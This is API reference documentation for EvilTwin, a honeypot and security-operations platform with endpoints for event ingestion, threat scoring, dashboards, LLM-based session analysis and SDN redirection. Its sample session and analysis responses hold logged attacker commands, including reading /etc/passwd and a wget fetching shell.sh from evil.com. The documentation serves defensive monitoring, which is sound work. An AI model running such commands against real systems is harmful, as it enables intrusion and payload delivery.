---
id: api-reference
title: API Reference
---

# API Reference

Complete reference for all EvilTwin REST and WebSocket endpoints.

:::tip Interactive documentation
When the backend is running, visit `http://localhost:8000/docs` for an interactive Swagger UI where you can test every endpoint directly in the browser.
:::

## Authentication

All endpoints (except `/auth/register`, `/auth/login`, `/auth/refresh`, `/log`, `/health`, and `/canary/webhook`) require a JWT Bearer token.

**How to get a token:**

```bash
# 1. Register a user (first time only)
curl -X POST http://localhost:8000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "analyst", "password": "StrongPass123!", "role": "analyst"}'

# 2. Log in to receive tokens
curl -X POST http://localhost:8000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "analyst", "password": "StrongPass123!"}'
```

The login response contains:
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer"
}
```

**Use the token in every request:**
```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/sessions
```

**Token lifecycle:**
- Access tokens expire after `ACCESS_TOKEN_EXPIRE_MINUTES` (default: 30)
- When expired, use the refresh token to get a new access token
- If `SECRET_KEY` changes, all existing tokens are immediately invalidated

---

## Authentication Endpoints

### `POST /auth/register`

Create a new user account.

**Request:**
```bash
curl -X POST http://localhost:8000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "analyst1", "password": "StrongPass123!", "role": "analyst"}'
```

**Request body:**

| Field | Type | Required | Description |
|---|---|---|---|
| `username` | string | Yes | Unique username |
| `password` | string | Yes | Minimum 8 characters |
| `role` | string | No | `admin`, `analyst`, or `viewer` (default: `viewer`) |

**Response (201 Created):**
```json
{"username": "analyst1", "role": "analyst", "id": "uuid"}
```

---

### `POST /auth/login`

Authenticate and receive JWT token pair.

**Request:**
```bash
curl -X POST http://localhost:8000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "analyst1", "password": "StrongPass123!"}'
```

**Response (200 OK):**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer"
}
```

**Error responses:**
- `401` — wrong username or password
- `422` — missing required fields

---

### `POST /auth/refresh`

Exchange a refresh token for a new access token. Call this when the access token expires.

**Request:**
```bash
curl -X POST http://localhost:8000/auth/refresh \
  -H "Content-Type: application/json" \
  -d '{"refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}'
```

**Response (200 OK):**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer"
}
```

---

## Ingestion Endpoints

### `POST /log`

Ingest a honeypot event. Called automatically by Cowrie and Dionaea sensors. Does not require user authentication (it is on the internal network segment only).

**Request:**
```bash
curl -X POST http://localhost:8000/log \
  -H "Content-Type: application/json" \
  -d '{
    "eventid": "cowrie.command.input",
    "src_ip": "203.0.113.10",
    "src_port": 50555,
    "dst_ip": "10.0.2.10",
    "dst_port": 22,
    "session": "sess-001",
    "protocol": "ssh",
    "timestamp": "2024-01-15T10:00:00Z",
    "message": "command executed",
    "input": "whoami"
  }'
```

**Request body fields:**

| Field | Type | Required | Description |
|---|---|---|---|
| `src_ip` | string (IPv4) | Yes | Attacker source IP |
| `dst_ip` | string (IPv4) | Yes | Honeypot IP that was hit |
| `protocol` | string | Yes | `ssh`, `ftp`, `http`, `smb`, etc. |
| `timestamp` | string (ISO 8601) | Yes | Event time in UTC, e.g. `2024-01-15T10:00:00Z` |
| `eventid` | string | No | Sensor-specific event type |
| `session` | string | No | Sensor session identifier |
| `src_port` | int | No | Source port |
| `dst_port` | int | No | Destination port |
| `message` | string | No | Human-readable description |
| `input` | string | No | Command typed by attacker |
| `payload` | object | No | Additional arbitrary event data |

**Response (200 OK):**
```json
{
  "session_id": "8f83b632-6a3f-4e01-92be-7c8702c2e08e",
  "threat_score": 0.85,
  "threat_level": 3,
  "status": "processed"
}
```

:::warning High threat level
If `threat_level` returns `3` or `4`, the SDN controller will install a redirect rule for this IP on its next polling cycle.
:::

---

## Session Endpoints

### `GET /sessions`

Retrieve a paginated list of attack sessions. Requires authentication.

**Request:**
```bash
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8000/sessions?page=1&page_size=25&threat_level=3"
```

**Query parameters:**

| Parameter | Type | Required | Description |
|---|---|---|---|
| `page` | int | Yes | Page number, 1-indexed |
| `page_size` | int | No | Records per page (default: 50, max: 100) |
| `threat_level` | int | No | Filter: minimum threat level (0–4) |
| `src_ip` | string | No | Filter: exact attacker IP match |
| `start_date` | string (ISO 8601) | No | Filter: sessions starting after this date |
| `end_date` | string (ISO 8601) | No | Filter: sessions starting before this date |

**Response (200 OK):**
```json
{
  "items": [
    {
      "id": "8f83b632-6a3f-4e01-92be-7c8702c2e08e",
      "src_ip": "203.0.113.10",
      "protocol": "ssh",
      "sensor_id": "cowrie-01",
      "threat_score": 0.85,
      "threat_level": 3,
      "country": "RU",
      "vpn_detected": false,
      "first_seen": "2024-01-15T10:00:00Z",
      "last_seen": "2024-01-15T10:05:00Z",
      "event_count": 12
    }
  ],
  "total": 847,
  "page": 1,
  "pages": 34
}
```

---

### `GET /sessions/{session_id}`

Get full detail for a specific session including all raw events.

**Request:**
```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:8000/sessions/8f83b632-6a3f-4e01-92be-7c8702c2e08e
```

**Response (200 OK):**
```json
{
  "id": "8f83b632-6a3f-4e01-92be-7c8702c2e08e",
  "src_ip": "203.0.113.10",
  "protocol": "ssh",
  "threat_score": 0.85,
  "threat_level": 3,
  "commands": ["whoami", "id", "cat /etc/passwd", "wget http://evil.com/shell.sh"],
  "credentials_attempted": [{"username": "root", "password": "admin"}],
  "events": [...],
  "first_seen": "2024-01-15T10:00:00Z",
  "last_seen": "2024-01-15T10:05:00Z"
}
```

---

## Scoring Endpoints

### `GET /score/{ip}`

Get the current threat score for an IP address. This is the primary endpoint polled by the SDN controller.

**Request:**
```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:8000/score/203.0.113.10
```

**Response (200 OK):**
```json
{
  "ip": "203.0.113.10",
  "threat_score": 0.95,
  "threat_level": 4,
  "vpn_detected": false,
  "country": "CN",
  "last_seen": "2024-01-15T10:05:00Z"
}
```

**Error responses:**
- `404` — IP has no recorded activity; SDN treats this as threat_level 0
- `422` — malformed IP address

---

## Dashboard Endpoints

### `GET /dashboard/stats`

Aggregate statistics for the SOC dashboard header cards.

**Request:**
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/dashboard/stats
```

**Response (200 OK):**
```json
{
  "total_sessions_24h": 1247,
  "critical_alerts_24h": 14,
  "unique_ips_24h": 389,
  "avg_threat_score": 0.42,
  "vpn_percentage": 0.31,
  "top_protocol": "ssh"
}
```

---

### `GET /dashboard/timeline`

Session counts grouped by time interval for the dashboard time-series chart.

**Query parameters:**

| Parameter | Type | Description |
|---|---|---|
| `interval` | string | Grouping interval: `hour`, `day` (default: `hour`) |
| `hours` | int | How many hours back to look (default: 24) |

**Response (200 OK):**
```json
{
  "labels": ["2024-01-15T08:00Z", "2024-01-15T09:00Z", "2024-01-15T10:00Z"],
  "values": [42, 67, 134]
}
```

---

### `GET /dashboard/top-attackers`

Top 10 IP addresses by session count or threat score.

**Request:**
```bash
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8000/dashboard/top-attackers?sort_by=threat_score&limit=10"
```

**Query parameters:**

| Parameter | Type | Description |
|---|---|---|
| `sort_by` | string | `session_count` or `threat_score` (default: `threat_score`) |
| `limit` | int | Number of results (default: 10, max: 50) |

**Response (200 OK):**
```json
{
  "attackers": [
    {
      "ip": "203.0.113.10",
      "session_count": 47,
      "threat_score": 0.97,
      "threat_level": 4,
      "country": "RU"
    }
  ]
}
```

---

## AI / LLM Endpoints

### `GET /ai/status`

Check if the AI assistant is available and configured.

**Request:**
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/ai/status
```

**Response (200 OK):**
```json
{
  "available": true,
  "model": "gpt-4o-mini",
  "provider": "openai"
}
```

If `LLM_API_KEY` is not configured, `available` will be `false`.

---

### `POST /ai/analyze`

Request an AI-powered analysis of a specific attack session. The LLM reads the session's commands, credentials attempted, and behavioral patterns, then produces a structured threat intelligence report.

**Request:**
```bash
curl -X POST http://localhost:8000/ai/analyze \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"session_id": "8f83b632-6a3f-4e01-92be-7c8702c2e08e"}'
```

**Response (200 OK):**
```json
{
  "session_id": "8f83b632-6a3f-4e01-92be-7c8702c2e08e",
  "summary": "The attacker performed a credential brute force followed by privilege escalation and persistence via cron job. This is consistent with an initial access broker attempting to establish a foothold for later exploitation.",
  "ttps": [
    {"id": "T1110", "name": "Brute Force", "tactic": "Credential Access"},
    {"id": "T1059.004", "name": "Unix Shell", "tactic": "Execution"},
    {"id": "T1053.003", "name": "Cron", "tactic": "Persistence"}
  ],
  "iocs": [
    {"type": "ip", "value": "203.0.113.10"},
    {"type": "url", "value": "http://evil.com/shell.sh"},
    {"type": "filename", "value": "shell.sh"}
  ],
  "severity": "critical",
  "recommended_actions": [
    "Block source IP 203.0.113.10 at the perimeter firewall",
    "Check for cron jobs installed by 'root' in the last 24 hours",
    "Hunt for 'shell.sh' on any production systems"
  ]
}
```

**Error responses:**
- `404` — session_id not found
- `503` — LLM service not configured or unavailable

---

### `POST /ai/chat`

Have a conversational exchange with the AI assistant about any threat intelligence topic. Can optionally be tied to a specific session for context.

**Request:**
```bash
curl -X POST http://localhost:8000/ai/chat \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "8f83b632-6a3f-4e01-92be-7c8702c2e08e",
    "message": "Is this attacker likely an automated bot or a human operator? What is their likely end goal?"
  }'
```

**Request body:**

| Field | Type | Required | Description |
|---|---|---|---|
| `message` | string | Yes | Your question or prompt |
| `session_id` | string | No | Session ID to include as context |
| `conversation_history` | array | No | Previous messages for multi-turn conversation |

**Response (200 OK):**
```json
{
  "response": "Based on the deliberate pace of commands, manual correction of typos, and the specific sequence (whoami → id → /etc/passwd → targeted wget), this appears to be a human operator rather than an automated script. The targeting of /etc/passwd for potential exfiltration and the attempt to download a named payload suggest the goal is establishing persistent access, likely as an initial access broker selling footholds.",
  "model": "gpt-4o-mini"
}
```

---

## Alert Endpoints

### `GET /alerts`

Retrieve recent alert history.

**Query parameters:**

| Parameter | Type | Description |
|---|---|---|
| `page` | int | Page number |
| `page_size` | int | Records per page (default: 50) |
| `min_level` | int | Minimum threat level (0–4) |

---

### `WS /ws/alerts`

Real-time WebSocket feed pushing new alerts to the SOC dashboard.

:::note WebSocket authentication
Unlike REST endpoints that use HTTP headers, WebSockets use a URL query parameter:
```
ws://localhost:8000/ws/alerts?token=<your_jwt_access_token>
```
:::

**Connection example (JavaScript):**
```javascript
const token = localStorage.getItem('access_token');
const ws = new WebSocket(`ws://localhost:8000/ws/alerts?token=${token}`);

ws.onmessage = (event) => {
  const alert = JSON.parse(event.data);
  console.log('New alert:', alert);
};
```

**Message format:**
```json
{
  "event_type": "THREAT_ESCALATION",
  "payload": {
    "session_id": "8f83b632-6a3f-4e01-92be-7c8702c2e08e",
    "src_ip": "203.0.113.10",
    "threat_level": 4,
    "message": "Critical privilege escalation attempt detected.",
    "created_at": "2024-01-15T10:05:00Z"
  }
}
```

---

## Canary Webhook Endpoint

### `POST /canary/webhook`

Receive canary token trigger notifications from Canarytokens.org or a self-hosted canary service.

**Authentication**: This endpoint uses HMAC-SHA256 signature verification instead of JWT. The webhook provider signs the payload with your `CANARY_WEBHOOK_SECRET`.

**Request headers:**
- `X-Canary-Signature: sha256=<hmac_signature>`
- `Content-Type: application/json`

**Request body:**
```json
{
  "token_id": "tok_abc123",
  "timestamp": "2024-01-15T10:00:00Z",
  "src_ip": "203.0.113.99",
  "user_agent": "Mozilla/5.0...",
  "memo": "Finance spreadsheet Q4 2024"
}
```

**Response (200 OK):**
```json
{"status": "received", "alert_id": "alert-uuid"}
```

**Replay protection**: Requests with a timestamp older than `CANARY_WEBHOOK_TOLERANCE_SECONDS` (default: 300 seconds) are rejected with `400 Bad Request`.

---

## Health Endpoint

### `GET /health`

Check backend and database health. No authentication required.

**Request:**
```bash
curl -s http://localhost:8000/health
```

**Response (200 OK — healthy):**
```json
{
  "status": "healthy",
  "database": true,
  "uptime_seconds": 3600
}
```

**Response (503 — unhealthy):**
```json
{
  "status": "unhealthy",
  "database": false,
  "error": "Cannot connect to database"
}
```

---

## SDN Controller REST API

Exposed on port `8080` within the Docker internal network. Used for manual overrides and debugging.

:::warning Internal only
The SDN controller REST API must not be exposed to the internet. It sits inside the Docker network and is only accessible from the controller's host machine or other containers in the same network.
:::

### `GET /flows`

Returns all currently active OpenFlow redirection rules.

```bash
curl http://localhost:8080/stats/flow/1
```

### `POST /flows`

Manually install a redirect rule for an IP address, overriding the ML model.

```bash
curl -X POST http://localhost:8080/flows \
  -H "Content-Type: application/json" \
  -d '{"ip": "203.0.113.10", "duration": 3600}'
```

| Field | Type | Description |
|---|---|---|
| `ip` | string | IPv4 address to redirect |
| `duration` | int | Seconds until rule expires (0 = permanent) |

### `DELETE /flows/{ip}`

Remove the redirect rule for an IP immediately.

```bash
curl -X DELETE http://localhost:8080/flows/203.0.113.10
```

---

## Common Error Codes

| HTTP Code | Meaning | Common Cause |
|---|---|---|
| `401 Unauthorized` | No token or expired token | Re-login with `POST /auth/login` |
| `403 Forbidden` | Valid token but insufficient role | Your role can't access this endpoint |
| `404 Not Found` | Resource doesn't exist | IP has no sessions, or session_id is wrong |
| `422 Unprocessable Entity` | Invalid request body | Missing required field, wrong date format, invalid IP |
| `429 Too Many Requests` | Rate limit exceeded | Authentication endpoints are rate-limited |
| `503 Service Unavailable` | Dependency unavailable | LLM service not configured, database down |
